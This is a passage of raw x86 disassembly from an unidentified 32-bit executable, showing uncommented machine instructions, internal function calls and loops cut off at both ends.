  401986:	e8 0b 18 00 00       	call   0x403196
  40198b:	83 c4 04             	add    $0x4,%esp
  40198e:	68 00 00 00 00       	push   $0x0
  401993:	e9 0c 02 00 00       	jmp    0x401ba4
  401998:	ff 35 84 b1 40 00    	push   0x40b184
  40199e:	68 01 00 00 00       	push   $0x1
  4019a3:	e8 c8 47 00 00       	call   0x406170
  4019a8:	21 c0                	and    %eax,%eax
  4019aa:	74 1a                	je     0x4019c6
  4019ac:	ff 35 9c b1 40 00    	push   0x40b19c
  4019b2:	68 01 00 00 00       	push   $0x1
  4019b7:	e8 94 48 00 00       	call   0x406250
  4019bc:	68 01 00 00 00       	push   $0x1
  4019c1:	e8 0a 46 00 00       	call   0x405fd0
  4019c6:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  4019cb:	50                   	push   %eax
  4019cc:	50                   	push   %eax
  4019cd:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  4019d2:	50                   	push   %eax
  4019d3:	50                   	push   %eax
  4019d4:	ff 35 b0 b3 40 00    	push   0x40b3b0
  4019da:	e8 9a 20 00 00       	call   0x403a79
  4019df:	ff 05 b0 b3 40 00    	incl   0x40b3b0
  4019e5:	8b 15 90 a3 40 00    	mov    0x40a390,%edx
  4019eb:	01 14 24             	add    %edx,(%esp)
  4019ee:	e8 22 44 00 00       	call   0x405e15
  4019f3:	ff 05 b0 b3 40 00    	incl   0x40b3b0
  4019f9:	8b 15 90 a3 40 00    	mov    0x40a390,%edx
  4019ff:	01 14 24             	add    %edx,(%esp)
  401a02:	e8 89 44 00 00       	call   0x405e90
  401a07:	8f 05 b0 b3 40 00    	pop    0x40b3b0
  401a0d:	ff 35 2c b1 40 00    	push   0x40b12c
  401a13:	e8 7e 17 00 00       	call   0x403196
  401a18:	83 c4 04             	add    $0x4,%esp
  401a1b:	68 00 00 00 00       	push   $0x0
  401a20:	e9 7f 01 00 00       	jmp    0x401ba4
  401a25:	8b 15 2c b1 40 00    	mov    0x40b12c,%edx
  401a2b:	ff 35 b0 b3 40 00    	push   0x40b3b0
  401a31:	e8 ba 5a 00 00       	call   0x4074f0
  401a36:	ba ba a0 40 00       	mov    $0x40a0ba,%edx
  401a3b:	e8 b0 5a 00 00       	call   0x4074f0
  401a40:	8b 15 84 b1 40 00    	mov    0x40b184,%edx
  401a46:	e8 a5 5a 00 00       	call   0x4074f0
  401a4b:	8d 0d 84 b1 40 00    	lea    0x40b184,%ecx
  401a51:	5a                   	pop    %edx
  401a52:	e8 99 16 00 00       	call   0x4030f0
  401a57:	ff 35 84 b1 40 00    	push   0x40b184
  401a5d:	68 01 00 00 00       	push   $0x1
  401a62:	e8 09 47 00 00       	call   0x406170
  401a67:	21 c0                	and    %eax,%eax
  401a69:	74 1c                	je     0x401a87
  401a6b:	ff 35 9c b1 40 00    	push   0x40b19c
  401a71:	68 01 00 00 00       	push   $0x1
  401a76:	e8 d5 47 00 00       	call   0x406250
  401a7b:	68 01 00 00 00       	push   $0x1
  401a80:	e8 4b 45 00 00       	call   0x405fd0
  401a85:	eb 3e                	jmp    0x401ac5
  401a87:	ff 35 84 b1 40 00    	push   0x40b184
  401a8d:	e8 0e 44 00 00       	call   0x405ea0
  401a92:	e8 8e 05 00 00       	call   0x402025
  401a97:	68 10 00 00 00       	push   $0x10
  401a9c:	ff 35 58 b1 40 00    	push   0x40b158
  401aa2:	ff 35 3c b1 40 00    	push   0x40b13c
  401aa8:	e8 f5 1b 00 00       	call   0x4036a2
  401aad:	ff 35 2c b1 40 00    	push   0x40b12c
  401ab3:	e8 de 16 00 00       	call   0x403196
  401ab8:	83 c4 04             	add    $0x4,%esp
  401abb:	68 01 00 00 00       	push   $0x1
  401ac0:	e9 df 00 00 00       	jmp    0x401ba4
  401ac5:	8b 15 a0 b1 40 00    	mov    0x40b1a0,%edx
  401acb:	31 c9                	xor    %ecx,%ecx
  401acd:	e8 ee 59 00 00       	call   0x4074c0
  401ad2:	75 0b                	jne    0x401adf
  401ad4:	ff 35 a0 b1 40 00    	push   0x40b1a0
  401ada:	e8 39 06 00 00       	call   0x402118
  401adf:	ff 35 b0 b3 40 00    	push   0x40b3b0
  401ae5:	8b 15 7c b1 40 00    	mov    0x40b17c,%edx
  401aeb:	ff 35 b0 b3 40 00    	push   0x40b3b0
  401af1:	e8 fa 59 00 00       	call   0x4074f0
  401af6:	8b 15 28 b1 40 00    	mov    0x40b128,%edx
  401afc:	e8 ef 59 00 00       	call   0x4074f0
  401b01:	ff 05 b0 b3 40 00    	incl   0x40b3b0
  401b07:	ff 35 24 b1 40 00    	push   0x40b124
  401b0d:	ff 35 84 b1 40 00    	push   0x40b184
  401b13:	8b 15 90 a3 40 00    	mov    0x40a390,%edx
  401b19:	01 54 24 08          	add    %edx,0x8(%esp)
  401b1d:	e8 3f 0c 00 00       	call   0x402761
  401b22:	8f 05 b0 b3 40 00    	pop    0x40b3b0
  401b28:	e8 f8 04 00 00       	call   0x402025
  401b2d:	ff 35 84 b1 40 00    	push   0x40b184
  401b33:	e8 68 43 00 00       	call   0x405ea0
  401b38:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  401b3d:	50                   	push   %eax
  401b3e:	50                   	push   %eax
  401b3f:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  401b44:	50                   	push   %eax
  401b45:	50                   	push   %eax
  401b46:	ff 35 b0 b3 40 00    	push   0x40b3b0
  401b4c:	e8 28 1f 00 00       	call   0x403a79
  401b51:	ff 05 b0 b3 40 00    	incl   0x40b3b0
  401b57:	8b 15 90 a3 40 00    	mov    0x40a390,%edx
  401b5d:	01 14 24             	add    %edx,(%esp)
  401b60:	e8 b0 42 00 00       	call   0x405e15
  401b65:	ff 05 b0 b3 40 00    	incl   0x40b3b0
  401b6b:	8b 15 90 a3 40 00    	mov    0x40a390,%edx
  401b71:	01 14 24             	add    %edx,(%esp)
  401b74:	e8 17 43 00 00       	call   0x405e90
  401b79:	8f 05 b0 b3 40 00    	pop    0x40b3b0
  401b7f:	ff 35 2c b1 40 00    	push   0x40b12c
  401b85:	e8 0c 16 00 00       	call   0x403196
  401b8a:	83 c4 04             	add    $0x4,%esp
  401b8d:	68 00 00 00 00       	push   $0x0
  401b92:	eb 10                	jmp    0x401ba4
  401b94:	ff 35 74 b1 40 00    	push   0x40b174
  401b9a:	e8 15 16 00 00       	call   0x4031b4
  401b9f:	68 00 00 00 00       	push   $0x0
  401ba4:	e8 10 00 00 00       	call   0x401bb9
  401ba9:	ff 35 f8 b0 40 00    	push   0x40b0f8
  401baf:	e8 06 16 00 00       	call   0x4031ba
  401bb4:	e8 07 16 00 00       	call   0x4031c0
  401bb9:	e8 4d 1f 00 00       	call   0x403b0b
  401bbe:	e8 fd 20 00 00       	call   0x403cc0
  401bc3:	e8 e8 21 00 00       	call   0x403db0
  401bc8:	e8 83 25 00 00       	call   0x404150
  401bcd:	e8 41 2e 00 00       	call   0x404a13
  401bd2:	e8 59 44 00 00       	call   0x406030
  401bd7:	e8 40 4c 00 00       	call   0x40681c
  401bdc:	c3                   	ret
  401bdd:	53                   	push   %ebx
  401bde:	31 c0                	xor    %eax,%eax
  401be0:	50                   	push   %eax
  401be1:	50                   	push   %eax
  401be2:	50                   	push   %eax
  401be3:	68 00 04 00 00       	push   $0x400
  401be8:	e8 d3 21 00 00       	call   0x403dc0
  401bed:	89 04 24             	mov    %eax,(%esp)
  401bf0:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  401bf5:	50                   	push   %eax
  401bf6:	50                   	push   %eax
  401bf7:	e8 b6 42 00 00       	call   0x405eb2
  401bfc:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401c00:	5a                   	pop    %edx
  401c01:	e8 ea 14 00 00       	call   0x4030f0
  401c06:	ff 34 24             	push   (%esp)
  401c09:	68 00 00 00 00       	push   $0x0
  401c0e:	68 0d a0 40 00       	push   $0x40a00d
  401c13:	ff 74 24 10          	push   0x10(%esp)
  401c17:	e8 aa 15 00 00       	call   0x4031c6
  401c1c:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  401c21:	50                   	push   %eax
  401c22:	50                   	push   %eax
  401c23:	ff 74 24 08          	push   0x8(%esp)
  401c27:	e8 24 22 00 00       	call   0x403e50
  401c2c:	8d 0d 2c b1 40 00    	lea    0x40b12c,%ecx
  401c32:	5a                   	pop    %edx
  401c33:	e8 b8 14 00 00       	call   0x4030f0
  401c38:	ff 34 24             	push   (%esp)
  401c3b:	e8 f0 21 00 00       	call   0x403e30
  401c40:	ff 35 2c b1 40 00    	push   0x40b12c
  401c46:	e8 55 42 00 00       	call   0x405ea0
  401c4b:	ff 35 2c b1 40 00    	push   0x40b12c
  401c51:	e8 bd 42 00 00       	call   0x405f13
  401c56:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  401c5b:	50                   	push   %eax
  401c5c:	50                   	push   %eax
  401c5d:	e8 73 41 00 00       	call   0x405dd5
  401c62:	8d 0d 24 b1 40 00    	lea    0x40b124,%ecx
  401c68:	5a                   	pop    %edx
  401c69:	e8 82 14 00 00       	call   0x4030f0
  401c6e:	8b 44 24 14          	mov    0x14(%esp),%eax
  401c72:	e8 29 22 00 00       	call   0x403ea0
  401c77:	50                   	push   %eax
  401c78:	31 db                	xor    %ebx,%ebx
  401c7a:	3b 1c 24             	cmp    (%esp),%ebx
  401c7d:	75 6b                	jne    0x401cea
  401c7f:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  401c83:	43                   	inc    %ebx
  401c84:	89 d8                	mov    %ebx,%eax
  401c86:	e8 15 22 00 00       	call   0x403ea0
  401c8b:	89 c3                	mov    %eax,%ebx
  401c8d:	83 fb 01             	cmp    $0x1,%ebx
  401c90:	75 31                	jne    0x401cc3
  401c92:	ff 35 b0 b3 40 00    	push   0x40b3b0
  401c98:	ba 0e a0 40 00       	mov    $0x40a00e,%edx
  401c9d:	e8 4e 58 00 00       	call   0x4074f0
  401ca2:	8b 15 24 b1 40 00    	mov    0x40b124,%edx
  401ca8:	e8 43 58 00 00       	call   0x4074f0
  401cad:	ba 11 a0 40 00       	mov    $0x40a011,%edx
  401cb2:	e8 39 58 00 00       	call   0x4074f0
  401cb7:	8d 0d 28 b1 40 00    	lea    0x40b128,%ecx
  401cbd:	5a                   	pop    %edx
  401cbe:	e8 2d 14 00 00       	call   0x4030f0
  401cc3:	8b 15 2c b1 40 00    	mov    0x40b12c,%edx
  401cc9:	ff 35 b0 b3 40 00    	push   0x40b3b0
  401ccf:	e8 1c 58 00 00       	call   0x4074f0
  401cd4:	8d 0d 24 b1 40 00    	lea    0x40b124,%ecx
  401cda:	5a                   	pop    %edx
  401cdb:	e8 10 14 00 00       	call   0x4030f0
  401ce0:	c7 44 24 0c 02 00 00 	movl   $0x2,0xc(%esp)
  401ce7:	00 
  401ce8:	eb 12                	jmp    0x401cfc
  401cea:	bb 01 00 00 00       	mov    $0x1,%ebx
  401cef:	3b 1c 24             	cmp    (%esp),%ebx
  401cf2:	75 08                	jne    0x401cfc
  401cf4:	c7 44 24 0c 01 00 00 	movl   $0x1,0xc(%esp)
  401cfb:	00 
  401cfc:	58                   	pop    %eax
  401cfd:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  401d01:	03 5c 24 08          	add    0x8(%esp),%ebx
  401d05:	89 d8                	mov    %ebx,%eax
  401d07:	e8 94 21 00 00       	call   0x403ea0
  401d0c:	a3 1c b1 40 00       	mov    %eax,0x40b11c
  401d11:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  401d15:	03 5c 24 08          	add    0x8(%esp),%ebx
  401d19:	43                   	inc    %ebx
  401d1a:	89 d8                	mov    %ebx,%eax
  401d1c:	e8 7f 21 00 00       	call   0x403ea0
  401d21:	a3 20 b1 40 00       	mov    %eax,0x40b120
  401d26:	b8 01 00 00 00       	mov    $0x1,%eax
  401d2b:	eb 02                	jmp    0x401d2f
  401d2d:	31 c0                	xor    %eax,%eax
  401d2f:	ff 74 24 04          	push   0x4(%esp)
  401d33:	e8 18 58 00 00       	call   0x407550
  401d38:	83 c4 0c             	add    $0xc,%esp
  401d3b:	5b                   	pop    %ebx
  401d3c:	c2 04 00             	ret    $0x4
  401d3f:	55                   	push   %ebp
  401d40:	53                   	push   %ebx
  401d41:	57                   	push   %edi
  401d42:	ba 0d 00 00 00       	mov    $0xd,%edx
  401d47:	83 ec 04             	sub    $0x4,%esp
  401d4a:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401d51:	4a                   	dec    %edx
  401d52:	75 f3                	jne    0x401d47
  401d54:	8b 54 24 48          	mov    0x48(%esp),%edx
  401d58:	8d 0c 24             	lea    (%esp),%ecx
  401d5b:	e8 a0 13 00 00       	call   0x403100
  401d60:	68 05 00 00 00       	push   $0x5
  401d65:	8d 54 24 08          	lea    0x8(%esp),%edx
  401d69:	52                   	push   %edx
  401d6a:	68 00 00 00 00       	push   $0x0
  401d6f:	8b 54 24 10          	mov    0x10(%esp),%edx
  401d73:	e8 98 13 00 00       	call   0x403110
  401d78:	b8 04 00 00 00       	mov    $0x4,%eax
  401d7d:	68 04 00 00 00       	push   $0x4
  401d82:	e8 19 13 00 00       	call   0x4030a0
  401d87:	68 05 00 00 00       	push   $0x5
  401d8c:	8d 54 24 10          	lea    0x10(%esp),%edx
  401d90:	52                   	push   %edx
  401d91:	68 00 00 00 00       	push   $0x0
  401d96:	8b 54 24 18          	mov    0x18(%esp),%edx
  401d9a:	e8 71 13 00 00       	call   0x403110
  401d9f:	b8 04 00 00 00       	mov    $0x4,%eax
  401da4:	68 04 00 00 00       	push   $0x4
  401da9:	e8 f2 12 00 00       	call   0x4030a0
  401dae:	68 05 00 00 00       	push   $0x5
  401db3:	8d 54 24 18          	lea    0x18(%esp),%edx
  401db7:	52                   	push   %edx
  401db8:	68 00 00 00 00       	push   $0x0
  401dbd:	8b 54 24 20          	mov    0x20(%esp),%edx
  401dc1:	e8 4a 13 00 00       	call   0x403110
  401dc6:	b8 04 00 00 00       	mov    $0x4,%eax
  401dcb:	68 04 00 00 00       	push   $0x4
  401dd0:	e8 cb 12 00 00       	call   0x4030a0
  401dd5:	ff 34 24             	push   (%esp)
  401dd8:	ff 74 24 60          	push   0x60(%esp)
  401ddc:	ff 74 24 54          	push   0x54(%esp)
  401de0:	e8 c3 06 00 00       	call   0x4024a8
  401de5:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401de9:	ff 34 24             	push   (%esp)
  401dec:	ff 74 24 64          	push   0x64(%esp)
  401df0:	ff 74 24 58          	push   0x58(%esp)
  401df4:	e8 af 06 00 00       	call   0x4024a8
  401df9:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401dfd:	ff 34 24             	push   (%esp)
  401e00:	ff 74 24 68          	push   0x68(%esp)
  401e04:	ff 74 24 5c          	push   0x5c(%esp)
  401e08:	e8 9b 06 00 00       	call   0x4024a8
  401e0d:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401e11:	ff 74 24 4c          	push   0x4c(%esp)
  401e15:	8b 6c 24 08          	mov    0x8(%esp),%ebp
  401e19:	8f 45 00             	pop    0x0(%ebp)
  401e1c:	8b 44 24 50          	mov    0x50(%esp),%eax
  401e20:	89 45 04             	mov    %eax,0x4(%ebp)
  401e23:	8b 44 24 54          	mov    0x54(%esp),%eax
  401e27:	89 45 08             	mov    %eax,0x8(%ebp)
  401e2a:	ff 74 24 5c          	push   0x5c(%esp)
  401e2e:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  401e32:	8f 45 00             	pop    0x0(%ebp)
  401e35:	8b 44 24 60          	mov    0x60(%esp),%eax
  401e39:	89 45 04             	mov    %eax,0x4(%ebp)
  401e3c:	8b 44 24 64          	mov    0x64(%esp),%eax
  401e40:	89 45 08             	mov    %eax,0x8(%ebp)
  401e43:	83 7c 24 58 00       	cmpl   $0x0,0x58(%esp)
  401e48:	0f 84 43 01 00 00    	je     0x401f91
  401e4e:	8b 44 24 58          	mov    0x58(%esp),%eax
  401e52:	e8 59 20 00 00       	call   0x403eb0
  401e57:	89 44 24 20          	mov    %eax,0x20(%esp)
  401e5b:	8b 5c 24 58          	mov    0x58(%esp),%ebx
  401e5f:	83 c3 04             	add    $0x4,%ebx
  401e62:	89 d8                	mov    %ebx,%eax
  401e64:	e8 47 20 00 00       	call   0x403eb0
  401e69:	89 44 24 24          	mov    %eax,0x24(%esp)
  401e6d:	8b 5c 24 58          	mov    0x58(%esp),%ebx
  401e71:	83 c3 08             	add    $0x8,%ebx
  401e74:	89 d8                	mov    %ebx,%eax
  401e76:	e8 35 20 00 00       	call   0x403eb0
  401e7b:	89 44 24 28          	mov    %eax,0x28(%esp)
  401e7f:	ff 74 24 20          	push   0x20(%esp)
  401e83:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  401e87:	8f 45 00             	pop    0x0(%ebp)
  401e8a:	8b 44 24 24          	mov    0x24(%esp),%eax
  401e8e:	89 45 04             	mov    %eax,0x4(%ebp)
  401e91:	8b 44 24 28          	mov    0x28(%esp),%eax
  401e95:	89 45 08             	mov    %eax,0x8(%ebp)
  401e98:	c7 44 24 2c 00 00 00 	movl   $0x0,0x2c(%esp)
  401e9f:	00 
  401ea0:	b8 02 00 00 00       	mov    $0x2,%eax
  401ea5:	3b 44 24 2c          	cmp    0x2c(%esp),%eax
  401ea9:	0f 8c e2 00 00 00    	jl     0x401f91
  401eaf:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  401eb3:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  401eb7:	c1 e3 02             	shl    $0x2,%ebx
  401eba:	8b 5c 1d 00          	mov    0x0(%ebp,%ebx,1),%ebx
  401ebe:	8b 7c 24 2c          	mov    0x2c(%esp),%edi
  401ec2:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  401ec6:	c1 e7 02             	shl    $0x2,%edi
  401ec9:	3b 5c 3d 00          	cmp    0x0(%ebp,%edi,1),%ebx
  401ecd:	0f 8e b5 00 00 00    	jle    0x401f88
  401ed3:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  401ed7:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  401edb:	c1 e3 02             	shl    $0x2,%ebx
  401ede:	8b 5c 1d 00          	mov    0x0(%ebp,%ebx,1),%ebx
  401ee2:	81 c3 00 02 00 00    	add    $0x200,%ebx
  401ee8:	53                   	push   %ebx
  401ee9:	e8 d2 1e 00 00       	call   0x403dc0
  401eee:	89 44 24 30          	mov    %eax,0x30(%esp)
  401ef2:	83 7c 24 30 00       	cmpl   $0x0,0x30(%esp)
  401ef7:	74 61                	je     0x401f5a
  401ef9:	ff 74 24 30          	push   0x30(%esp)
  401efd:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  401f01:	8b 6c 24 08          	mov    0x8(%esp),%ebp
  401f05:	c1 e3 02             	shl    $0x2,%ebx
  401f08:	ff 74 1d 00          	push   0x0(%ebp,%ebx,1)
  401f0c:	e8 ff 1b 00 00       	call   0x403b10
  401f11:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  401f15:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  401f19:	c1 e3 02             	shl    $0x2,%ebx
  401f1c:	ff 74 1d 00          	push   0x0(%ebp,%ebx,1)
  401f20:	ff 74 24 34          	push   0x34(%esp)
  401f24:	e8 97 1f 00 00       	call   0x403ec0
  401f29:	8b 5c 24 2c          	mov    0x2c(%esp),%ebx
  401f2d:	c1 e3 02             	shl    $0x2,%ebx
  401f30:	ff 74 1d 00          	push   0x0(%ebp,%ebx,1)
  401f34:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  401f38:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  401f3c:	c1 e3 02             	shl    $0x2,%ebx
  401f3f:	58                   	pop    %eax
  401f40:	89 44 1d 00          	mov    %eax,0x0(%ebp,%ebx,1)
  401f44:	ff 74 24 30          	push   0x30(%esp)
  401f48:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  401f4c:	8b 6c 24 08          	mov    0x8(%esp),%ebp
  401f50:	c1 e3 02             	shl    $0x2,%ebx
  401f53:	58                   	pop    %eax
  401f54:	89 44 1d 00          	mov    %eax,0x0(%ebp,%ebx,1)
  401f58:	eb 2e                	jmp    0x401f88
  401f5a:	ff 35 2c b1 40 00    	push   0x40b12c
  401f60:	e8 31 12 00 00       	call   0x403196
  401f65:	83 c4 04             	add    $0x4,%esp
  401f68:	68 10 00 00 00       	push   $0x10
  401f6d:	ff 35 44 b1 40 00    	push   0x40b144
  401f73:	ff 35 3c b1 40 00    	push   0x40b13c
  401f79:	e8 24 17 00 00       	call   0x4036a2
  401f7e:	68 01 00 00 00       	push   $0x1
  401f83:	e9 1c fc ff ff       	jmp    0x401ba4
  401f88:	ff 44 24 2c          	incl   0x2c(%esp)
  401f8c:	e9 0f ff ff ff       	jmp    0x401ea0
  401f91:	8b 6c 24 04          	mov    0x4(%esp),%ebp
  401f95:	8b 45 00             	mov    0x0(%ebp),%eax
  401f98:	a3 04 b1 40 00       	mov    %eax,0x40b104
  401f9d:	8b 6c 24 0c          	mov    0xc(%esp),%ebp
  401fa1:	8b 45 00             	mov    0x0(%ebp),%eax
  401fa4:	a3 10 b1 40 00       	mov    %eax,0x40b110
  401fa9:	8b 45 04             	mov    0x4(%ebp),%eax
  401fac:	a3 14 b1 40 00       	mov    %eax,0x40b114
  401fb1:	8b 45 08             	mov    0x8(%ebp),%eax
  401fb4:	a3 18 b1 40 00       	mov    %eax,0x40b118
  401fb9:	8b 1d 14 b1 40 00    	mov    0x40b114,%ebx
  401fbf:	21 db                	and    %ebx,%ebx
  401fc1:	7e 11                	jle    0x401fd4
  401fc3:	8b 1d 18 b1 40 00    	mov    0x40b118,%ebx
  401fc9:	21 db                	and    %ebx,%ebx
  401fcb:	7e 07                	jle    0x401fd4
  401fcd:	b8 01 00 00 00       	mov    $0x1,%eax
  401fd2:	eb 02                	jmp    0x401fd6
  401fd4:	31 c0                	xor    %eax,%eax
  401fd6:	21 c0                	and    %eax,%eax
  401fd8:	74 14                	je     0x401fee
  401fda:	8b 6c 24 04          	mov    0x4(%esp),%ebp
  401fde:	8b 45 04             	mov    0x4(%ebp),%eax
  401fe1:	a3 08 b1 40 00       	mov    %eax,0x40b108
  401fe6:	8b 45 08             	mov    0x8(%ebp),%eax
  401fe9:	a3 0c b1 40 00       	mov    %eax,0x40b10c
  401fee:	b8 01 00 00 00       	mov    $0x1,%eax
  401ff3:	eb 02                	jmp    0x401ff7
  401ff5:	31 c0                	xor    %eax,%eax
  401ff7:	ff 34 24             	push   (%esp)
  401ffa:	e8 51 55 00 00       	call   0x407550
  401fff:	50                   	push   %eax
  402000:	8b 54 24 08          	mov    0x8(%esp),%edx
  402004:	e8 07 11 00 00       	call   0x403110
  402009:	8b 54 24 10          	mov    0x10(%esp),%edx
  40200d:	e8 fe 10 00 00       	call   0x403110
  402012:	8b 54 24 18          	mov    0x18(%esp),%edx
  402016:	e8 f5 10 00 00       	call   0x403110
  40201b:	58                   	pop    %eax
  40201c:	83 c4 34             	add    $0x34,%esp
  40201f:	5f                   	pop    %edi
  402020:	5b                   	pop    %ebx
  402021:	5d                   	pop    %ebp
  402022:	c2 24 00             	ret    $0x24
  402025:	55                   	push   %ebp
  402026:	53                   	push   %ebx
  402027:	8b 1d 1c b1 40 00    	mov    0x40b11c,%ebx
  40202d:	83 fb 01             	cmp    $0x1,%ebx
  402030:	75 50                	jne    0x402082
  402032:	ff 35 b4 b1 40 00    	push   0x40b1b4
  402038:	e8 10 1f 00 00       	call   0x403f4d
  40203d:	89 c3                	mov    %eax,%ebx
  40203f:	21 db                	and    %ebx,%ebx
  402041:	7e 3f                	jle    0x402082
  402043:	ff 35 b4 b1 40 00    	push   0x40b1b4
  402049:	e8 09 1f 00 00       	call   0x403f57
  40204e:	ff 35 b4 b1 40 00    	push   0x40b1b4
  402054:	e8 16 1f 00 00       	call   0x403f6f
  402059:	09 c0                	or     %eax,%eax
  40205b:	74 25                	je     0x402082
  40205d:	8b 2d b8 b1 40 00    	mov    0x40b1b8,%ebp
  402063:	ff 75 08             	push   0x8(%ebp)
  402066:	e8 f5 48 00 00       	call   0x406960
  40206b:	89 c3                	mov    %eax,%ebx
  40206d:	3b 5d 0c             	cmp    0xc(%ebp),%ebx
  402070:	75 0e                	jne    0x402080
  402072:	8b 2d b8 b1 40 00    	mov    0x40b1b8,%ebp
  402078:	ff 75 08             	push   0x8(%ebp)
  40207b:	e8 20 3e 00 00       	call   0x405ea0
  402080:	eb cc                	jmp    0x40204e
  402082:	b8 01 00 00 00       	mov    $0x1,%eax
  402087:	eb 02                	jmp    0x40208b
  402089:	31 c0                	xor    %eax,%eax
  40208b:	5b                   	pop    %ebx
  40208c:	5d                   	pop    %ebp
  40208d:	c3                   	ret
  40208e:	68 10 00 00 00       	push   $0x10
  402093:	ff 35 58 b1 40 00    	push   0x40b158
  402099:	ff 35 3c b1 40 00    	push   0x40b13c
  40209f:	e8 fe 15 00 00       	call   0x4036a2
  4020a4:	68 01 00 00 00       	push   $0x1
  4020a9:	e9 f6 fa ff ff       	jmp    0x401ba4
  4020ae:	31 c0                	xor    %eax,%eax
  4020b0:	c3                   	ret
  4020b1:	31 c0                	xor    %eax,%eax
  4020b3:	50                   	push   %eax
  4020b4:	50                   	push   %eax
  4020b5:	8b 54 24 10          	mov    0x10(%esp),%edx
  4020b9:	8d 0c 24             	lea    (%esp),%ecx
  4020bc:	e8 3f 10 00 00       	call   0x403100
  4020c1:	68 0a 00 00 00       	push   $0xa
  4020c6:	ff 74 24 04          	push   0x4(%esp)
  4020ca:	ff 74 24 14          	push   0x14(%esp)
  4020ce:	e8 f9 10 00 00       	call   0x4031cc
  4020d3:	89 44 24 04          	mov    %eax,0x4(%esp)
  4020d7:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  4020dc:	74 24                	je     0x402102
  4020de:	ff 74 24 04          	push   0x4(%esp)
  4020e2:	ff 74 24 10          	push   0x10(%esp)
  4020e6:	e8 e7 10 00 00       	call   0x4031d2
  4020eb:	a3 30 b1 40 00       	mov    %eax,0x40b130
  4020f0:	ff 74 24 04          	push   0x4(%esp)
  4020f4:	ff 74 24 10          	push   0x10(%esp)
  4020f8:	e8 db 10 00 00       	call   0x4031d8
  4020fd:	a3 6c b1 40 00       	mov    %eax,0x40b16c
  402102:	8b 44 24 04          	mov    0x4(%esp),%eax
  402106:	eb 02                	jmp    0x40210a
  402108:	31 c0                	xor    %eax,%eax
  40210a:	ff 34 24             	push   (%esp)
  40210d:	e8 3e 54 00 00       	call   0x407550
  402112:	83 c4 08             	add    $0x8,%esp
  402115:	c2 08 00             	ret    $0x8
  402118:	55                   	push   %ebp
  402119:	53                   	push   %ebx
  40211a:	ba 0a 00 00 00       	mov    $0xa,%edx
  40211f:	83 ec 04             	sub    $0x4,%esp
  402122:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402129:	4a                   	dec    %edx
  40212a:	75 f3                	jne    0x40211f
  40212c:	8b 54 24 34          	mov    0x34(%esp),%edx
  402130:	8d 0c 24             	lea    (%esp),%ecx
  402133:	e8 c8 0f 00 00       	call   0x403100
  402138:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  40213f:	00 
  402140:	ff 35 24 b1 40 00    	push   0x40b124
  402146:	e8 45 3d 00 00       	call   0x405e90
  40214b:	a1 b0 b3 40 00       	mov    0x40b3b0,%eax
  402150:	50                   	push   %eax
  402151:	50                   	push   %eax
  402152:	68 13 a0 40 00       	push   $0x40a013
  402157:	ff 74 24 10          	push   0x10(%esp)
  40215b:	ff 74 24 10          	push   0x10(%esp)
  40215f:	e8 bc 10 00 00       	call   0x403220
  402164:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  402168:	5a                   	pop    %edx
  402169:	e8 82 0f 00 00       	call   0x4030f0
  40216e:	8b 54 24 08          	mov    0x8(%esp),%edx
  402172:	31 c9                	xor    %ecx,%ecx
  402174:	e8 47 53 00 00       	call   0x4074c0
  402179:	75 57                	jne    0x4021d2
  40217b:	8b 5c 24 04          	mov    0x4(%esp),%ebx
  40217f:	83 e3 01             	and    $0x1,%ebx
  402182:	21 db                	and    %ebx,%ebx
  402184:	75 23                	jne    0x4021a9
  402186:	ff 74 24 08          	push   0x8(%esp)
  40218a:	e8 31 11 00 00       	call   0x4032c0
  40218f:	50                   	push   %eax
  402190:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  402194:	8b 2d ac b1 40 00    	mov    0x40b1ac,%ebp
  40219a:	c1 e3 03             	shl    $0x3,%ebx
  40219d:	01 dd                	add    %ebx,%ebp
  40219f:	58                   	pop    %eax
  4021a0:	89 45 04             	mov    %eax,0x4(%ebp)
  4021a3:	ff 44 24 0c          	incl   0xc(%esp)
  4021a7:	eb 27                	jmp    0x4021d0
  4021a9:	8b 54 24 08          	mov    0x8(%esp),%edx
  4021ad:	ff 35 b0 b3 40 00    	push   0x40b3b0
  4021b3:	e8 38 53 00 00       	call   0x4074f0
  4021b8:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  4021bc:	8b 2d ac b1 40 00    	mov    0x40b1ac,%ebp
  4021c2:	c1 e3 03             	shl    $0x3,%ebx
  4021c5:	01 dd                	add    %ebx,%ebp
  4021c7:	8d 4d 00             	lea    0x0(%ebp),%ecx
  4021ca:	5a                   	pop    %edx
  4021cb:	e8 20 0f 00 00       	call   0x4030f0
  4021d0:	eb 02                	jmp    0x4021d4
  4021d2:	eb 09                	jmp    0x4021dd
  4021d4:	ff 44 24 04          	incl   0x4(%esp)
  4021d8:	e9 6e ff ff ff       	jmp    0x40214b
